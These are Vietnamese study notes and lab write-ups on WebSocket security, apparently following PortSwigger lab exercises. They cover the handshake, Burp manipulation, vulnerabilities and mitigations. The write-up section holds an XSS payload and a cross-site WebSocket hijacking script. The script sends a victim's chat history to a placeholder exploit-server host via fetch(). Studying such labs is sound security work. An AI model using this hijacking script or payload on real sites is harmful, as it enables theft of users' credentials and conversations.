jsx
var ws = new WebSocket("wss://normal-website.com/chat");
```

> Lưu ý:
> 
> - Giao thức `wss` thiết lập một WebSocket thông qua kết nối TLS được mã hóa.
> - Giao thức `ws` thiết lập kết nối không mã hóa.

---

## Quá trình bắt tay

---

Để thiết lập kết nối, trình duyệt và server thực hiện một **WebSocket handshake** qua HTTP.

Trình duyệt gửi một **yêu cầu handshake** như sau:

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

Nếu server chấp nhận kết nối, nó sẽ trả về **phản hồi handshake** như sau:

```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

Tại thời điểm này, kết nối mạng sẽ được giữ mở và có thể được sử dụng để gửi thông điệp WebSocket theo cả hai chiều.

---

## Điểm quan trọng

---

- Header **Connection** và **Upgrade** trong cả request và response cho biết đây là một **WebSocket handshake**.
- Header **Sec-WebSocket-Version** cho biết phiên bản giao thức WebSocket mà client muốn sử dụng (thông thường là 13).
- Header **Sec-WebSocket-Key** chứa một giá trị ngẫu nhiên được mã hóa bằng Base64, và phải được sinh ngẫu nhiên trong mỗi request handshake.
- Header **Sec-WebSocket-Accept** trong response chứa một **hash** của giá trị trong `Sec-WebSocket-Key` nối với một chuỗi cụ thể được định nghĩa trong đặc tả giao thức. Điều này nhằm ngăn chặn các phản hồi giả mạo do server cấu hình sai hoặc proxy cache.

---

## Websockets message

---

Khi một kết nối WebSocket đã được thiết lập, thông điệp có thể được gửi **bất đồng bộ theo cả hai chiều** bởi client hoặc server.

Một thông điệp đơn giản có thể được gửi từ trình duyệt bằng JavaScript phía client như sau:

```jsx
ws.send("Peter Wiener");
```

Về nguyên tắc, **thông điệp WebSocket có thể chứa bất kỳ nội dung hoặc định dạng dữ liệu nào**. Trong các ứng dụng hiện đại, JSON thường được sử dụng để gửi dữ liệu có cấu trúc trong thông điệp WebSocket.

Ví dụ, một ứng dụng **chat-bot** dùng WebSocket có thể gửi thông điệp như sau:

```json
{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}
```

---

# Thao túng Websockets traffic

<!-- TOC -->
## Mục lục

- [Quá trình bắt tay](#quá-trình-bắt-tay)
- [Điểm quan trọng](#điểm-quan-trọng)
- [Websockets message](#websockets-message)
- [Intercept & Modify](#intercept--modify)
- [Replay & Generate](#replay--generate)
- [Manipulate](#manipulate)
- [Websockets message](#websockets-message-1)
- [Websockets handshake](#websockets-handshake)
- [**Cross-site WebSocket hijacking**](#cross-site-websocket-hijacking)
  - [Khái niệm](#khái-niệm)
  - [Hậu quả](#hậu-quả)
  - [Tấn công](#tấn-công)
- [Manipulating WebSocket messages to exploit vulnerabilities](#manipulating-websocket-messages-to-exploit-vulnerabilities)
- [Cross-site WebSocket hijacking](#cross-site-websocket-hijacking-1)
- [Manipulating the WebSocket handshake to exploit vulnerabilities](#manipulating-the-websocket-handshake-to-exploit-vulnerabilities)
<!-- /TOC -->

---

Việc tìm các lỗ hổng bảo mật liên quan đến WebSocket thường bao gồm **thao tác** chúng theo những cách mà ứng dụng không lường trước được. Bạn có thể làm điều này bằng **Burp Suite**.

Bạn có thể sử dụng Burp Suite để:

- Chặn và chỉnh sửa các thông điệp WebSocket.
- Phát lại và tạo các thông điệp WebSocket mới.
- Thao tác các kết nối WebSocket.

---

## Intercept & Modify

---

Bạn có thể dùng Burp Proxy để chặn và sửa thông điệp WebSocket như sau:

1. Mở trình duyệt của Burp.
2. Duyệt tới chức năng của ứng dụng đang sử dụng WebSockets. Bạn có thể xác định ứng dụng đang dùng WebSockets bằng cách thao tác ứng dụng và quan sát các mục xuất hiện trong **thẻ lịch sử WebSockets** (WebSockets history) trong Burp Proxy.
3. Ở **thẻ Intercept** của Burp Proxy, đảm bảo rằng chế độ chặn (interception) đang được bật.
4. Khi một thông điệp WebSocket được gửi từ trình duyệt hoặc server, nó sẽ hiện trong thẻ Intercept để bạn xem hoặc chỉnh sửa. Nhấn nút **Forward** để chuyển tiếp thông điệp.

> **Lưu ý**
> 
> Bạn có thể cấu hình xem sẽ chặn các thông điệp **từ client tới server** hay **từ server tới client** trong Burp Proxy. Thao tác này thực hiện trong hộp thoại **Settings**, ở phần **cài đặt quy tắc chặn WebSocket** (WebSocket interception rules).

---

## Replay & Generate

---

Ngoài việc chặn và chỉnh sửa thông điệp WebSocket ngay lập tức, bạn có thể **phát lại (replay)** các thông điệp riêng lẻ và **tạo thông điệp mới**. Bạn có thể làm điều này bằng **Burp Repeater**:

1. Trong Burp Proxy, chọn một thông điệp trong **WebSockets history**, hoặc trong thẻ **Intercept**, rồi chọn **"Send to Repeater"** từ menu ngữ cảnh.
2. Trong Burp Repeater, bạn có thể chỉnh sửa thông điệp đã chọn và gửi lại nhiều lần.
3. Bạn có thể nhập một thông điệp mới và gửi nó theo cả hai hướng, tới client hoặc tới server.
4. Trong **bảng "History"** của Burp Repeater, bạn có thể xem lịch sử các thông điệp đã được truyền qua kết nối WebSocket. Điều này bao gồm các thông điệp mà bạn đã tạo trong Burp Repeater, cũng như các thông điệp được trình duyệt hoặc server tạo ra qua cùng kết nối.
5. Nếu bạn muốn chỉnh sửa và gửi lại bất kỳ thông điệp nào trong bảng history, bạn có thể làm điều đó bằng cách chọn thông điệp và chọn **"Edit and resend"** từ menu ngữ cảnh.

---

## Manipulate

---

Bên cạnh việc thao túng thông điệp WebSocket, đôi khi cần phải thao túng **bắt tay WebSocket** dùng để thiết lập kết nối.

Có nhiều tình huống khi thao túng bắt tay WebSocket là cần thiết:

- Nó có thể cho phép bạn tiếp cận nhiều bề mặt tấn công hơn.
- Một số cuộc tấn công có thể khiến kết nối của bạn bị rớt nên bạn cần thiết lập lại một kết nối mới.
- Token hoặc dữ liệu khác trong yêu cầu bắt tay ban đầu có thể đã lỗi thời và cần được cập nhật.

Bạn có thể thao túng bắt tay WebSocket bằng **Burp Repeater**:

1. Gửi một thông điệp WebSocket tới Burp Repeater như đã mô tả ở trên.
2. Trong Burp Repeater, nhấn biểu tượng bút chì bên cạnh URL WebSocket. Điều này mở ra một trình hướng dẫn (wizard) cho phép bạn đính kèm vào một WebSocket đã kết nối, nhân bản (clone) một WebSocket đã kết nối, hoặc kết nối lại (reconnect) tới một WebSocket bị ngắt.
3. Nếu bạn chọn nhân bản một WebSocket đã kết nối hoặc kết nối lại tới một WebSocket bị ngắt, trình hướng dẫn sẽ hiển thị đầy đủ chi tiết của yêu cầu bắt tay WebSocket, mà bạn có thể chỉnh sửa theo yêu cầu trước khi thực hiện bắt tay.
4. Khi bạn nhấn **"Connect"**, Burp sẽ cố gắng thực hiện bắt tay đã cấu hình và hiển thị kết quả. Nếu một kết nối WebSocket mới được thiết lập thành công, bạn có thể sử dụng kết nối này để gửi các thông điệp mới trong Burp Repeater.

---

# Lỗ hổng Websockets

---

Về nguyên tắc, hầu như **mọi lỗ hổng bảo mật web** đều có thể xuất hiện liên quan đến WebSockets:

- Dữ liệu do người dùng cung cấp được truyền tới server có thể bị xử lý một cách không an toàn, dẫn tới các lỗ hổng như **SQL injection** hoặc **XML external entity (XXE) injection**.
- Một số lỗ hổng "mù" (blind) tiếp cận qua WebSockets chỉ có thể phát hiện bằng **kỹ thuật ngoài băng (out-of-band, OAST)**.
- Nếu dữ liệu do kẻ tấn công điều khiển được truyền qua WebSockets tới người dùng khác của ứng dụng, thì điều này có thể dẫn tới **XSS** hoặc các lỗ hổng phía client khác.

---

## Websockets message

---

Phần lớn các lỗ hổng dựa trên đầu vào ảnh hưởng đến WebSockets có thể được tìm thấy và khai thác bằng cách **thao túng nội dung** của các thông điệp WebSocket.

Ví dụ, giả sử một ứng dụng chat sử dụng WebSockets để gửi tin nhắn giữa trình duyệt và server. Khi một người dùng gõ tin nhắn, một thông điệp WebSocket như sau được gửi tới server:

```json
{"message":"Hello Carlos"}
```

Nội dung của tin nhắn được truyền (một lần nữa qua WebSockets) tới một người dùng chat khác, và được hiển thị trong trình duyệt của người dùng như sau:

```html
<td>Hello Carlos</td>
```

Trong trường hợp này, nếu không có bất kỳ xử lý đầu vào hoặc biện pháp phòng vệ nào khác, kẻ tấn công có thể thực hiện một **tấn công XSS minh chứng** bằng cách gửi thông điệp WebSocket sau:

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

---

## Websockets handshake

---

Một số lỗ hổng WebSockets chỉ có thể được phát hiện và khai thác bằng cách thao tác **bắt tay (handshake)** WebSocket. Các lỗ hổng này thường liên quan đến **lỗi thiết kế**, chẳng hạn như:

- Tin tưởng sai lệch vào các header HTTP để đưa ra quyết định bảo mật, ví dụ header **X-Forwarded-For**.
- Lỗi trong cơ chế xử lý phiên (session), vì **ngữ cảnh phiên** mà trong đó các thông điệp WebSocket được xử lý thường được xác định bởi ngữ cảnh phiên của yêu cầu bắt tay.
- Bề mặt tấn công được tạo ra bởi các **header HTTP tùy chỉnh** do ứng dụng sử dụng.

---

## **Cross-site WebSocket hijacking**

---

### Khái niệm

---

Chiếm đoạt WebSocket xuyên trang (còn được gọi là chiếm đoạt WebSocket xuyên nguồn) liên quan đến một lỗ hổng giả mạo yêu cầu xuyên trang (CSRF) trên bước bắt tay (handshake) WebSocket. Nó phát sinh khi yêu cầu bắt tay WebSocket chỉ dựa vào cookie HTTP để xử lý phiên và không chứa bất kỳ token CSRF hay giá trị không thể đoán trước nào khác.

Kẻ tấn công có thể tạo một trang web độc hại trên tên miền của chính họ, trang này thiết lập một kết nối WebSocket xuyên trang tới ứng dụng dễ bị tấn công. Ứng dụng sẽ xử lý kết nối trong ngữ cảnh phiên của người dùng bị hại với ứng dụng đó.

Trang của kẻ tấn công sau đó có thể gửi các thông điệp tùy ý tới server qua kết nối và đọc nội dung các thông điệp nhận lại từ server. Điều này có nghĩa là, khác với CSRF thông thường, kẻ tấn công có được tương tác hai chiều với ứng dụng đã bị xâm phạm.

---

### Hậu quả

---

Một cuộc tấn công chiếm đoạt WebSocket xuyên trang thành công thường cho phép kẻ tấn công:

- **Thực hiện hành động trái phép dưới danh nghĩa người dùng nạn nhân:** Tương tự như CSRF thông thường, kẻ tấn công có thể gửi các thông điệp tùy ý tới ứng dụng phía server. Nếu ứng dụng sử dụng thông điệp WebSocket do client tạo ra để thực hiện các hành động nhạy cảm, thì kẻ tấn công có thể tạo ra các thông điệp phù hợp từ một miền khác và kích hoạt các hành động đó.
- **Thu thập dữ liệu nhạy cảm mà người dùng có quyền truy cập:** Khác với CSRF thông thường, chiếm đoạt WebSocket xuyên trang cho phép kẻ tấn công **tương tác hai chiều** với ứng dụng dễ bị tấn công qua WebSocket đã bị chiếm đoạt. Nếu ứng dụng sử dụng thông điệp WebSocket do server sinh ra để trả dữ liệu nhạy cảm cho người dùng, thì kẻ tấn công có thể chặn những thông điệp này và đánh cắp dữ liệu của nạn nhân.

---

### Tấn công

---

Vì tấn công chiếm đoạt WebSocket xuyên trang về bản chất là một lỗ hổng CSRF trên bước bắt tay (handshake) WebSocket, bước đầu tiên để thực hiện tấn công là xem xét các bắt tay WebSocket mà ứng dụng thực hiện và xác định xem chúng có được bảo vệ chống CSRF hay không.

Về điều kiện thông thường của các tấn công CSRF, bạn thường cần tìm một thông điệp bắt tay mà chỉ dựa vào cookie HTTP để xử lý phiên và không sử dụng bất kỳ token hay giá trị không thể đoán trước nào trong các tham số yêu cầu.

Ví dụ, yêu cầu bắt tay WebSocket sau có khả năng bị CSRF, vì token phiên duy nhất được truyền qua cookie:

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

> Lưu ý
> 
> Header `Sec-WebSocket-Key` chứa một giá trị ngẫu nhiên để ngăn lỗi từ các proxy cache, và **không** được dùng cho mục đích xác thực hoặc xử lý phiên.

Nếu yêu cầu bắt tay WebSocket dễ bị CSRF, thì trang web của kẻ tấn công có thể thực hiện một yêu cầu xuyên trang để mở một WebSocket trên trang dễ bị tấn công. Điều xảy ra tiếp theo trong cuộc tấn công phụ thuộc hoàn toàn vào logic của ứng dụng và cách ứng dụng sử dụng WebSockets. Cuộc tấn công có thể bao gồm:

- Gửi các thông điệp WebSocket để thực hiện các hành động trái phép thay mặt cho người dùng nạn nhân.
- Gửi các thông điệp WebSocket để lấy dữ liệu nhạy cảm.
- Đôi khi, chỉ đơn giản là chờ các thông điệp đến chứa dữ liệu nhạy cảm.

---

# Bảo mật

---

Để giảm thiểu rủi ro lỗ hổng bảo mật phát sinh với WebSockets, hãy tuân theo các hướng dẫn sau:

- Sử dụng giao thức `wss://` (WebSocket qua TLS).
- **Hard-code** URL của endpoint WebSocket, và tuyệt đối không đưa dữ liệu do người dùng kiểm soát vào URL này.
- Bảo vệ thông điệp bắt tay (handshake) WebSocket chống **CSRF** để tránh lỗ hổng chiếm đoạt WebSocket xuyên nguồn (cross-site WebSocket hijacking).
- Xem dữ liệu nhận qua WebSocket là **không tin cậy theo cả hai chiều**. Xử lý dữ liệu an toàn ở cả phía server và client để ngăn các lỗ hổng dựa trên đầu vào như **SQL injection** và **cross-site scripting (XSS)**.

# WU

## Manipulating WebSocket messages to exploit vulnerabilities
- ở bài lab này Server nhận tin nhắn từ WebSocket và hiển thị thẳng lên màn hình của tư vấn viên (Support Agent) mà không thực hiện kiểm tra (Sanitize) lại.
- ở chức năng chat của web, bật intercept để sửa tin nhắn trước khi gửi lên server
`{"message":"<img src=1 onerror='alert(1)'>"}`


## Cross-site WebSocket hijacking
- ở bài lab này, khi một trình duyệt gửi yêu cầu "Nâng cấp" (Upgrade) từ HTTP lên WebSocket, nó vẫn gửi kèm theo Cookie của người dùng. Nếu Hacker lừa nạn nhân truy cập một trang web độc hại, trang web đó có thể khởi tạo một kết nối WebSocket đến Server mục tiêu nhân danh nạn nhân.

![](../../image/Pasted%20image%2020260503034903.png)
trong request có gửi kèm `Cookie: session=...` nhưng **không có** bất kỳ CSRF token nào trong Header hoặc trong tin nhắn khởi đầu. Điều này có nghĩa là WebSocket chỉ dựa vào Cookie để biết ai đang chat.

- đoạn script để exploit 
```
<script>
    // Kết nối đến WebSocket của Lab nhân danh nạn nhân
    var ws = new WebSocket('wss://[YOUR-LAB-ID].web-security-academy.net/chat');
    
    ws.onopen = function() {
        // Gửi tin nhắn khởi tạo nếu cần (tùy thuộc vào logic của bài Lab)
        ws.send("READY");
    };
    
    ws.onmessage = function(event) {
        // Khi Server gửi lịch sử chat về, ta tuồn dữ liệu đó về Exploit Server của mình
        fetch('https://[YOUR-EXPLOIT-SERVER-ID].exploit-server.net/log?res=' + btoa(event.data));
    };
</script>

```
sau khi thay url của web chat và burp colla và ấn deliver to victim
- quay lại burp collar và ấn poll nao để lấy toàn bộ thông tin cuộc trò chuyên
- ta thấy credential đã bị lộ ở 1 request
![](../../image/Pasted%20image%2020260503035043.png)

## Manipulating the WebSocket handshake to exploit vulnerabilities

- ở  bài lab này server đã chặn các payload XSS phổ biến, nhưng lại mắc lỗi khi tin tưởng vào các Header HTTP dùng để xác định danh tính người dùng.

- dùng burp intercept để chèn payload vào: `<img src=1 onerror='alert(1)'>`
- sau đó khi ta chat lại thì bị disconnect, có thể dọ ip đã bị đưa vào ds đen

![](../../image/Pasted%20image%2020260503035754.png)
![](../../image/Pasted%20image%2020260503040053.png)

